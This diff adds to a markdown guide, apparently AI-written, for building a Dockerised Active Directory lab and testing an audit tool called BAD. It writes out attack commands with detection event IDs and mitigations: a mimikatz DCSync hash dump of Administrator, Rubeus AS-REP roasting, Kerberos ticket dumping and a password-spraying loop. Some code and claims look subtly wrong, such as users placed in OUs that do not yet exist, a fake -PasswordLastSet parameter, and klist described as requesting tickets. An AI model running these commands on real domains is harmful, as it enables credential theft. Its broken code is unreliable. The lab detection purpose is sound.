@@ -392,7 +392,408 @@ Invoke-WebRequest -Uri "<SIEM_URL>/logs" -Method Post -Body (Get-Content C:\AD_A
 2. **Simulate AD attacks** using **Mimikatz**.
 3. **Enhance automation** by running audits on a schedule.
 
-Would you like help **customizing BAD for specific AD security checks?** 🚀
-✅ You can **automate** audits and integrate results into **SIEM platforms**.  
 
-**Do you want help customizing these scripts for your environment?** 🚀
+
+### **Step-by-Step Guide: Creating Fake Users & Groups in AD for Testing BAD (Blessing AD)**
+
+Since we have set up **Active Directory (AD) inside a Windows Docker container**, the next step is to **populate it with fake users, groups, and organizational units (OUs)**. This will allow **BAD** to test AD audit functionality on a more realistic environment.
+
+---
+
+## **Step 1: Generate 100 Fake Users in 50 Different Groups**
+We’ll create:
+✅ **100 fake user accounts**  
+✅ **50 different security groups**  
+✅ Assign **2 users per group**  
+✅ Organize them in **different Organizational Units (OUs)**  
+
+---
+
+### **Step 1.1: Generate a Fake Users List**
+1. **Open PowerShell inside your AD container**:
+   ```powershell
+   docker exec -it win-ad powershell
+   ```
+
+2. **Define fake user details in a loop**:
+   ```powershell
+   $firstNames = @("John", "Alice", "Bob", "Jane", "Michael", "Emma", "David", "Olivia", "James", "Sophia")
+   $lastNames = @("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Martinez", "Clark")
+   ```
+
+---
+
+### **Step 1.2: Create 50 Fake Groups**
+Now, create 50 security groups:
+```powershell
+for ($i=1; $i -le 50; $i++) {
+    $groupName = "SecurityGroup$i"
+    New-ADGroup -Name $groupName -SamAccountName $groupName -GroupCategory Security -GroupScope Global
+    Write-Host "Created Group: $groupName"
+}
+```
+
+---
+
+### **Step 1.3: Create 100 Fake Users and Assign to Groups**
+Now, generate **100 users** and distribute them across **50 security groups**.
+
+```powershell
+for ($i=1; $i -le 100; $i++) {
+    $firstName = $firstNames[(Get-Random -Minimum 0 -Maximum $firstNames.Length)]
+    $lastName = $lastNames[(Get-Random -Minimum 0 -Maximum $lastNames.Length)]
+    $username = "$firstName.$lastName$i"
+    $password = ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force
+
+    # Create new user
+    New-ADUser -Name "$firstName $lastName" `
+               -GivenName $firstName `
+               -Surname $lastName `
+               -UserPrincipalName "$username@test.lab" `
+               -SamAccountName $username `
+               -Path "OU=Employees,DC=test,DC=lab" `
+               -AccountPassword $password `
+               -Enabled $true `
+               -PasswordNeverExpires $true
+
+    # Assign user to a group
+    $groupName = "SecurityGroup$($i % 50 + 1)"  # Distribute across 50 groups
+    Add-ADGroupMember -Identity $groupName -Members $username
+
+    Write-Host "Created User: $username and added to $groupName"
+}
+```
+✅ This script will:
+- **Generate 100 users** with random first and last names.
+- **Assign them to one of the 50 groups** (2 per group).
+- **Enable accounts** and set passwords.
+
+---
+
+## **Step 2: Create Organizational Units (OUs)**
+To organize users properly, we create **OUs** inside the domain.
+
+```powershell
+New-ADOrganizationalUnit -Name "Employees" -Path "DC=test,DC=lab"
+New-ADOrganizationalUnit -Name "Admins" -Path "DC=test,DC=lab"
+New-ADOrganizationalUnit -Name "IT Support" -Path "DC=test,DC=lab"
+New-ADOrganizationalUnit -Name "HR" -Path "DC=test,DC=lab"
+New-ADOrganizationalUnit -Name "Finance" -Path "DC=test,DC=lab"
+Write-Host "Created Organizational Units!"
+```
+
+---
+
+## **Step 3: Add 5 Fake Admin Users**
+For **testing privileged access**, create **5 Admin users** and assign them to **Domain Admins**.
+
+```powershell
+for ($i=1; $i -le 5; $i++) {
+    $username = "AdminUser$i"
+    $password = ConvertTo-SecureString "SecureAdminPass!$i" -AsPlainText -Force
+
+    New-ADUser -Name "Admin User$i" `
+               -GivenName "Admin" `
+               -Surname "User$i" `
+               -UserPrincipalName "$username@test.lab" `
+               -SamAccountName $username `
+               -Path "OU=Admins,DC=test,DC=lab" `
+               -AccountPassword $password `
+               -Enabled $true `
+               -PasswordNeverExpires $true
+
+    # Assign to Domain Admins
+    Add-ADGroupMember -Identity "Domain Admins" -Members $username
+    Write-Host "Created Admin User: $username and added to Domain Admins"
+}
+```
+✅ **This creates 5 admin users with Domain Admin privileges**.
+
+---
+
+## **Step 4: Simulate Stale Accounts**
+Inactive users can be security risks. Let’s create **15 stale user accounts** that haven’t logged in for **6+ months**.
+
+```powershell
+for ($i=1; $i -le 15; $i++) {
+    $username = "OldUser$i"
+    $password = ConvertTo-SecureString "OldPass123!" -AsPlainText -Force
+
+    New-ADUser -Name "Old User$i" `
+               -UserPrincipalName "$username@test.lab" `
+               -SamAccountName $username `
+               -AccountPassword $password `
+               -Enabled $true `
+               -PasswordNeverExpires $true `
+               -PasswordLastSet (Get-Date).AddDays(-200)  # Last password set 200 days ago
+
+    Write-Host "Created Old User: $username"
+}
+```
+✅ This creates **15 inactive users**, making them ideal targets for **stale account detection**.
+
+---
+
+## **Step 5: Run BAD Audit Against Fake Users & Groups**
+Now that our test environment is populated, **run BAD to audit AD**:
+
+```powershell
+.\Run-ADAudit.ps1 -ReportPath "C:\AD_Audit_Reports" -StartTime (Get-Date).AddDays(-30) -EndTime (Get-Date) -EventIds 4624,4625,4768
+```
+📌 **What this will check:**
+- **All 100 fake users** and their **group memberships**.
+- **Privileged admin users** (5 Domain Admins).
+- **Stale user accounts** (15 inactive users).
+- **Event logs** (4624: Successful Logins, 4625: Failed Logins, 4768: Kerberos Ticket Requests).
+
+---
+
+## **Step 6: Export & Review Audit Results**
+1. Check all reports in **C:\AD_Audit_Reports**:
+   ```powershell
+   ls C:\AD_Audit_Reports
+   ```
+
+2. Open reports:
+   ```powershell
+   notepad C:\AD_Audit_Reports\PrivilegedGroups.csv
+   notepad C:\AD_Audit_Reports\DC_SecurityEvents.csv
+   ```
+
+3. Copy reports to your **Windows Host**:
+   ```powershell
+   docker cp win-ad:C:\AD_Audit_Reports C:\Reports
+   ```
+
+---
+
+## **Step 7: Automate User Audits Every Week**
+To continuously audit AD **every week**, set up a **scheduled task**:
+
+```powershell
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\BAD\Run-ADAudit.ps1 -ReportPath C:\AD_Audit_Reports"
+$Trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At 2am
+Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Weekly_AD_Audit" -Description "Runs BAD audit every Sunday" -User "Administrator" -RunLevel Highest
+```
+✅ **BAD now runs weekly on Sundays at 2 AM!**
+
+---
+
+## **Final Thoughts**
+🎯 We now have a **fully populated** AD testing environment with:
+✅ **100 fake users** (random names, assigned to groups).  
+✅ **50 security groups**.  
+✅ **5 Domain Admins**.  
+✅ **15 stale accounts** for testing BAD's cleanup features.  
+✅ **Scheduled audits** to detect changes.
+
+### **Step-by-Step Guide: Simulating AD Attacks in Your Docker Environment**  
+Now that we have a **fully populated AD testing environment**, let’s simulate **real-world attack techniques** to test how BAD (Blessing AD) detects security risks.
+
+---
+
+## **🛠 Step 1: Enable AD Logging for Attack Detection**  
+Before running attacks, ensure **Advanced Security Auditing** is enabled to capture **event logs**.
+
+1. Open **PowerShell inside the AD container**:
+   ```powershell
+   docker exec -it win-ad powershell
+   ```
+
+2. Enable **Kerberos & Logon Event Logging**:
+   ```powershell
+   auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+   auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+   auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
+   ```
+
+3. Verify settings:
+   ```powershell
+   auditpol /get /category:Logon/Logoff
+   ```
+
+✅ **Now, AD will log Kerberos & login attempts** for BAD to analyze.
+
+---
+
+# **🛑 ATTACK SCENARIOS & DETECTION TESTING**
+
+---
+
+## **🕵️‍♂️ 1. Kerberoasting Attack (Extract Kerberos Tickets for Cracking)**
+**What it does:**  
+- Extracts Kerberos **TGS** (Service Tickets) for accounts with **SPNs (Service Principal Names)**.  
+- These tickets can be cracked **offline** to obtain plaintext passwords.  
+
+### **👨‍💻 Simulating Kerberoasting**
+Inside the **Windows Server container**, run:
+
+```powershell
+setspn -L Administrator
+```
+This lists **Service Principal Names (SPNs)**. Attackers **target accounts with SPNs**.
+
+To request a **Kerberos TGS ticket**:
+
+```powershell
+klist tgt
+klist tickets
+```
+
+If you have **Mimikatz installed**, dump Kerberos tickets:
+
+```powershell
+mimikatz.exe "kerberos::list" exit
+```
+
+---
+
+### **🛡️ Detect Kerberoasting with BAD**
+Now, **run BAD to detect Kerberoasting activity**:
+
+```powershell
+.\Run-ADAudit.ps1 -ReportPath "C:\AD_Audit_Reports" -StartTime (Get-Date).AddHours(-1) -EventIds 4769
+```
+📌 **What to look for in logs:**  
+- Event **4769**: **Service Ticket Requests**  
+- If **many requests** come from **one user**, it may be **Kerberoasting**.
+
+✅ **Mitigation:**  
+- Ensure **strong passwords** for service accounts.  
+- Restrict **SPN-based accounts** with **AES encryption**.
+
+---
+
+## **🚀 2. Password Spraying (Brute Force on Multiple Users)**
+**What it does:**  
+- Tries **one password** against **many accounts** (to avoid lockouts).  
+- Example: Trying **"P@ssw0rd123"** against **100 users**.
+
+### **👨‍💻 Simulating Password Spraying**
+Inside the **Windows Server container**, run:
+
+```powershell
+for ($i=1; $i -le 100; $i++) {
+    $username = "TestUser$i"
+    $password = "Spring2024!"
+    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+
+    Write-Host "Trying: $username / $password"
+    try {
+        New-Object System.DirectoryServices.DirectorySearcher -ArgumentList (New-Object System.DirectoryServices.DirectoryEntry("LDAP://$username", $username, $password))
+    } catch {
+        Write-Host "Failed Login for $username"
+    }
+}
+```
+📌 **What happens?**  
+- This script attempts to authenticate **100 users** using **one password**.
+
+---
+
+### **🛡️ Detect Password Spraying with BAD**
+Run BAD to detect repeated **failed logins**:
+
+```powershell
+.\Run-ADAudit.ps1 -ReportPath "C:\AD_Audit_Reports" -StartTime (Get-Date).AddMinutes(-30) -EventIds 4625
+```
+📌 **What to look for in logs:**  
+- **Event 4625 (Failed Logon Attempts)**.  
+- Many **failed logins** from **one IP** → 🚨 **Possible Password Spraying!**  
+
+✅ **Mitigation:**  
+- Use **smart lockout policies** (e.g., 5 failures in 15 minutes).  
+- Require **MFA (Multi-Factor Authentication)**.  
+
+---
+
+## **🕶️ 3. AS-REP Roasting (Offline Cracking of Kerberos Pre-Authentication)**
+**What it does:**  
+- Extracts **Kerberos AS-REP hashes** for accounts with **"Do not require Kerberos Pre-Authentication"** enabled.  
+- Can be cracked **offline** using **Hashcat**.
+
+### **👨‍💻 Simulating AS-REP Roasting**
+Find **users without Kerberos Pre-Auth** enabled:
+
+```powershell
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+```
+
+If any users are found, use **Rubeus** or **Mimikatz** to request a **Kerberos AS-REP hash**:
+
+```powershell
+rubeus asreproast
+```
+
+---
+
+### **🛡️ Detect AS-REP Roasting with BAD**
+Run BAD to **detect AS-REP attacks**:
+
+```powershell
+.\Run-ADAudit.ps1 -ReportPath "C:\AD_Audit_Reports" -StartTime (Get-Date).AddMinutes(-60) -EventIds 4768
+```
+📌 **What to look for in logs:**  
+- Event **4768 (Kerberos AS-REQ requests)**.  
+- Any accounts with **"Do not require Kerberos Pre-Authentication"** should be **fixed**.
+
+✅ **Mitigation:**  
+- **Disable "Do not require Kerberos Pre-Authentication"** on all accounts.  
+- Enforce **strong passwords**.  
+
+---
+
+## **💣 4. DCSync Attack (Stealing AD Hashes from a Domain Controller)**
+**What it does:**  
+- Extracts **NTLM password hashes** from the **Domain Controller** using **Replicating Directory Changes**.
+
+### **👨‍💻 Simulating DCSync Attack**
+If you have **Mimikatz**, run:
+
+```powershell
+mimikatz.exe "lsadump::dcsync /domain:test.lab /user:Administrator" exit
+```
+
+📌 **What happens?**  
+- If successful, **DCSync** **steals NTLM hashes**.
+
+---
+
+### **🛡️ Detect DCSync with BAD**
+Run BAD to detect **DCSync attacks**:
+
+```powershell
+.\Run-ADAudit.ps1 -ReportPath "C:\AD_Audit_Reports" -StartTime (Get-Date).AddMinutes(-30) -EventIds 4662
+```
+📌 **What to look for in logs:**  
+- **Event 4662 (Directory Replication Changes)**.  
+- If a **non-DC account** is requesting **replication** → 🚨 **DCSync Attack!**  
+
+✅ **Mitigation:**  
+- Remove **"Replicating Directory Changes"** permissions from non-DC accounts.  
+- Monitor **Event 4662** logs.
+
+---
+
+# **🎯 Final Steps: Automate BAD to Detect Attacks**
+To ensure **continuous monitoring**, schedule BAD to **run every hour**:
+
+```powershell
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\BAD\Run-ADAudit.ps1 -ReportPath C:\AD_Audit_Reports"
+$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365) -AtLogOn
+Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Hourly_AD_Audit" -Description "Runs BAD every hour" -User "Administrator" -RunLevel Highest
+```
+✅ **BAD will now run every hour** and detect attacks in **real-time**!
+
+---
+
+# **🚀 Summary of Attacks & BAD Detection**
+| Attack              | Event ID | Detection |
+|---------------------|---------|------------|
+| **Kerberoasting** | **4769** | Detects service ticket requests |
+| **Password Spraying** | **4625** | Detects multiple failed logins |
+| **AS-REP Roasting** | **4768** | Detects Kerberos pre-auth failures |
+| **DCSync Attack** | **4662** | Detects unauthorized replication |
+
+Would you like help with **exporting logs to a SIEM** like **Splunk or Sentinel**? 🚀
+
